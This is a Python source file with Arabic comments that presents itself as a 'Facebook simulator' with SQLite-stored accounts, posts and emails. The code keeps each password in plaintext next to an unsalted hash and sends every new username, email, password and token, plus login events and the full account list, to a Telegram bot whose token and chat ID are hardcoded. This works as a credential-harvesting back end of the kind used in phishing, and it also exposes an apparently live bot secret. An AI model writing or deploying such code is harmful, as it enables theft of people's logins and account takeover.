import sqlite3
import hashlib
import json
import requests
from datetime import datetime
from pathlib import Path
import secrets
import string

class FacebookSimulator:
    def __init__(self, db_name="facebook.db", telegram_token=None, telegram_chat_id=None):
        self.db_name = db_name
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.init_database()
    
    def init_database(self):
        """إنشاء قاعدة البيانات والجداول"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        # جدول الحسابات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                password_plain TEXT NOT NULL,
                token TEXT UNIQUE,
                first_name TEXT,
                last_name TEXT,
                profile_pic TEXT,
                bio TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        # جدول الأصدقاء
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS friendships (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                friend_id INTEGER NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(user_id) REFERENCES accounts(id),
                FOREIGN KEY(friend_id) REFERENCES accounts(id)
            )
        ''')
        
        # جدول المنشورات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS posts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                content TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                likes INTEGER DEFAULT 0,
                FOREIGN KEY(user_id) REFERENCES accounts(id)
            )
        ''')
        
        # جدول البريد
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS emails (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER NOT NULL,
                email_address TEXT NOT NULL,
                email_type TEXT DEFAULT 'primary',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(account_id) REFERENCES accounts(id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def generate_token(self, length=32):
        """توليد توكن عشوائي للحساب"""
        characters = string.ascii_letters + string.digits
        return ''.join(secrets.choice(characters) for _ in range(length))
    
    def generate_email(self, username):
        """توليد بريد وهمي من اسم المستخدم"""
        # إزالة المسافات والأحرف الخاصة
        clean_username = username.replace("_", ".").replace(" ", ".")
        domains = ["facebook-simulator.com", "fbsim.io", "virtual-fb.com"]
        import random
        domain = random.choice(domains)
        return f"{clean_username}@{domain}"
    
    def hash_password(self, password):
        """تشفير كلمة المرور"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    def send_to_telegram(self, message):
        """إرسال رسالة إلى بوت التليجرام"""
        if not self.telegram_token or not self.telegram_chat_id:
            return {"status": "⚠️", "message": "بيانات التليجرام غير مكتملة"}
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {
                "chat_id": self.telegram_chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            response = requests.post(url, data=data)
            
            if response.status_code == 200:
                return {"status": "✅", "message": "تم إرسال الرسالة للتليجرام"}
            else:
                return {"status": "❌", "message": f"خطأ: {response.text}"}
        
        except Exception as e:
            return {"status": "❌", "message": f"خطأ في الإرسال: {str(e)}"}
    
    def create_account(self, username, first_name, last_name, password, email=None):
        """إنشاء حساب جديد مع بريد إلكتروني وتوكن"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        try:
            # إذا لم يتم إدخال بريد، ننشئ واحد تلقائياً
            if not email:
                email = self.generate_email(username)
            
            password_hash = self.hash_password(password)
            token = self.generate_token()
            
            # إدراج الحساب
            cursor.execute('''
                INSERT INTO accounts 
                (username, email, password_hash, password_plain, token, first_name, last_name)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (username, email, password_hash, password, token, first_name, last_name))
            
            account_id = cursor.lastrowid
            
            # إضافة البريد الأساسي
            cursor.execute('''
                INSERT INTO emails (account_id, email_address, email_type)
                VALUES (?, ?, 'primary')
            ''', (account_id, email))
            
            conn.commit()
            conn.close()
            
            result = {
                "status": "✅ نجح",
                "message": "تم إنشاء الحساب بنجاح",
                "account_id": account_id,
                "username": username,
                "email": email,
                "password": password,
                "token": token,
                "first_name": first_name,
                "last_name": last_name
            }
            
            # إرسال البيانات إلى التليجرام
            telegram_message = f"""
📱 <b>حساب جديد تم إنشاؤه!</b>

👤 <b>اسم المستخدم:</b> <code>{username}</code>
📧 <b>البريد الإلكتروني:</b> <code>{email}</code>
🔐 <b>كلمة المرور:</b> <code>{password}</code>
🎫 <b>التوكن:</b> <code>{token}</code>
✍️ <b>الاسم الكامل:</b> {first_name} {last_name}
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            self.send_to_telegram(telegram_message)
            
            return result
        
        except sqlite3.IntegrityError as e:
            conn.close()
            return {
                "status": "❌ فشل",
                "message": f"اسم المستخدم أو البريد موجود بالفعل: {str(e)}"
            }
    
    def login(self, username, password):
        """تسجيل الدخول"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        password_hash = self.hash_password(password)
        
        cursor.execute('''
            SELECT id, username, email, first_name, last_name, token FROM accounts
            WHERE username = ? AND password_hash = ?
        ''', (username, password_hash))
        
        user = cursor.fetchone()
        conn.close()
        
        if user:
            result = {
                "status": "✅ نجح",
                "message": "تم تسجيل الدخول بنجاح",
                "user_id": user[0],
                "username": user[1],
                "email": user[2],
                "first_name": user[3],
                "last_name": user[4],
                "token": user[5]
            }
            
            # إرسال إشعار تسجيل دخول إلى التليجرام
            telegram_message = f"""
🔓 <b>تسجيل دخول جديد!</b>

👤 <b>المستخدم:</b> <code>{username}</code>
📧 <b>البريد:</b> <code>{user[2]}</code>
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            self.send_to_telegram(telegram_message)
            
            return result
        else:
            return {
                "status": "❌ فشل",
                "message": "اسم المستخدم أو كلمة المرور غير صحيحة"
            }
    
    def get_account(self, account_id):
        """الحصول على بيانات الحساب"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, username, email, first_name, last_name, bio, token, created_at
            FROM accounts WHERE id = ?
        ''', (account_id,))
        
        account = cursor.fetchone()
        
        # الحصول على البريد الإلكتروني
        cursor.execute('''
            SELECT email_address, email_type FROM emails WHERE account_id = ?
        ''', (account_id,))
        
        emails = cursor.fetchall()
        conn.close()
        
        if account:
            return {
                "status": "✅",
                "id": account[0],
                "username": account[1],
                "email_primary": account[2],
                "first_name": account[3],
                "last_name": account[4],
                "bio": account[5],
                "token": account[6],
                "emails": [{"address": e[0], "type": e[1]} for e in emails],
                "created_at": account[7]
            }
        else:
            return {"status": "❌", "message": "الحساب غير موجود"}
    
    def add_email(self, account_id, email_address):
        """إضافة بريد إلكتروني إضافي للحساب"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO emails (account_id, email_address, email_type)
                VALUES (?, ?, 'secondary')
            ''', (account_id, email_address))
            
            conn.commit()
            conn.close()
            
            return {
                "status": "✅",
                "message": "تم إضافة البريد بنجاح",
                "email": email_address
            }
        
        except sqlite3.IntegrityError:
            conn.close()
            return {
                "status": "❌",
                "message": "البريد مستخدم بالفعل"
            }
    
    def create_post(self, account_id, content):
        """إنشاء منشور"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO posts (user_id, content)
            VALUES (?, ?)
        ''', (account_id, content))
        
        conn.commit()
        post_id = cursor.lastrowid
        conn.close()
        
        return {
            "status": "✅",
            "message": "تم نشر المنشور",
            "post_id": post_id
        }
    
    def get_all_accounts(self):
        """الحصول على جميع الحسابات"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, username, email, first_name, last_name, token, created_at
            FROM accounts ORDER BY created_at DESC
        ''')
        
        accounts = cursor.fetchall()
        conn.close()
        
        return [{
            "id": acc[0],
            "username": acc[1],
            "email": acc[2],
            "first_name": acc[3],
            "last_name": acc[4],
            "token": acc[5],
            "created_at": acc[6]
        } for acc in accounts]
    
    def export_accounts(self, filename="accounts_export.json"):
        """تصدير جميع الحسابات مع البيانات الكاملة"""
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, username, email, password_plain, token, first_name, last_name, created_at
            FROM accounts
        ''')
        
        accounts = cursor.fetchall()
        conn.close()
        
        data = []
        for acc in accounts:
            data.append({
                "id": acc[0],
                "username": acc[1],
                "email": acc[2],
                "password": acc[3],
                "token": acc[4],
                "first_name": acc[5],
                "last_name": acc[6],
                "created_at": acc[7]
            })
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        
        return {
            "status": "✅",
            "message": f"تم تصدير {len(data)} حساب",
            "file": filename,
            "accounts": data
        }
    
    def send_all_accounts_to_telegram(self):
        """إرسال قائمة بجميع الحسابات إلى التليجرام"""
        accounts = self.get_all_accounts()
        
        if not accounts:
            return {"status": "⚠️", "message": "لا توجد حسابات"}
        
        message = "<b>📋 قائمة جميع الحسابات:</b>\n\n"
        
        for i, acc in enumerate(accounts, 1):
            message += f"<b>{i}. اسم المستخدم:</b> <code>{acc['username']}</code>\n"
            message += f"   <b>البريد:</b> <code>{acc['email']}</code>\n"
            message += f"   <b>الاسم:</b> {acc['first_name']} {acc['last_name']}\n"
            message += f"   <b>التوكن:</b> <code>{acc['token']}</code>\n\n"
        
        return self.send_to_telegram(message)


# مثال على الاستخدام
if __name__ == "__main__":
    # بيانات التليجرام
    TELEGRAM_TOKEN = "8321731547:AAEOGHm4fLgb7vkTzF6EBJ2Yy-SLYsKceas"
    TELEGRAM_CHAT_ID = "5749281880"
    
    # إنشاء النظام
    fb = FacebookSimulator(
        telegram_token=TELEGRAM_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID
    )
    
    print("=" * 60)
    print("🔵 نظام محاكاة فيسبوك الافتراضية مع التليجرام")
    print("=" * 60)
    
    # إنشاء حسابات
    print("\n📝 إنشاء حسابات جديدة:\n")
    
    acc1 = fb.create_account(
        username="ahmed_salem",
        first_name="أحمد",
        last_name="سالم",
        password="password123"
    )
    print(f"✅ {acc1['username']}")
    print(f"   البريد: {acc1['email']}")
    print(f"   كلمة المرور: {acc1['password']}")
    print(f"   التوكن: {acc1['token'][:20]}...\n")
    
    acc2 = fb.create_account(
        username="fatima_ali",
        first_name="فاطمة",
        last_name="علي",
        password="secure456"
    )
    print(f"✅ {acc2['username']}")
    print(f"   البريد: {acc2['email']}")
    print(f"   كلمة المرور: {acc2['password']}")
    print(f"   التوكن: {acc2['token'][:20]}...\n")
    
    acc3 = fb.create_account(
        username="محمد_علي",
        first_name="محمد",
        last_name="علي",
        password="mypass789"
    )
    print(f"✅ {acc3['username']}")
    print(f"   البريد: {acc3['email']}")
    print(f"   كلمة المرور: {acc3['password']}")
    print(f"   التوكن: {acc3['token'][:20]}...\n")
    
    # تسجيل الدخول
    print("\n" + "=" * 60)
    print("🔐 اختبار تسجيل الدخول:\n")
    
    login_result = fb.login("ahmed_salem", "password123")
    print(f"📌 {login_result['message']}")
    print(f"   المستخدم: {login_result['username']}")
    print(f"   البريد: {login_result['email']}\n")
    
    # عرض الحسابات
    print("\n" + "=" * 60)
    print("👥 جميع الحسابات:\n")
    
    all_accounts = fb.get_all_accounts()
    for i, acc in enumerate(all_accounts, 1):
        print(f"{i}. {acc['username']} - {acc['email']}")
    
    # إرسال قائمة الحسابات إلى التليجرام
    print("\n" + "=" * 60)
    print("📤 إرسال قائمة الحسابات إلى التليجرام:\n")
    
    telegram_result = fb.send_all_accounts_to_telegram()
    print(f"✅ {telegram_result['message']}")
    
    # إضافة بريد إضافي
    print("\n" + "=" * 60)
    print("📧 إضافة بريد إلكتروني إضافي:\n")
    
    extra_email = fb.add_email(acc1['account_id'], "ahmed.salem@yahoo.com")
    print(f"✅ {extra_email['message']}")
    
    # عرض تفاصيل الحساب
    print("\n" + "=" * 60)
    print("📋 تفاصيل الحساب:\n")
    
    account_details = fb.get_account(acc1['account_id'])
    print(f"المستخدم: {account_details['username']}")
    print(f"الاسم: {account_details['first_name']} {account_details['last_name']}")
    print(f"البريد الأساسي: {account_details['email_primary']}")
    print(f"البريد الإضافي: {account_details['emails']}")
    print(f"التوكن: {account_details['token'][:20]}...")
    
    # إنشاء منشورات
    print("\n" + "=" * 60)
    print("📱 إنشاء منشورات:\n")
    
    post1 = fb.create_post(acc1['account_id'], "مرحباً بالجميع! 👋")
    print(f"✅ {post1['message']}")
    
    # تصدير البيانات
    print("\n" + "=" * 60)
    print("💾 تصدير البيانات:\n")
    
    export = fb.export_accounts()
    print(f"✅ {export['message']}")
    print(f"📁 الملف: {export['file']}")
    
    print("\n" + "=" * 60)
    print("✨ انتهى العرض التوضيحي!")
    print("=" * 60)
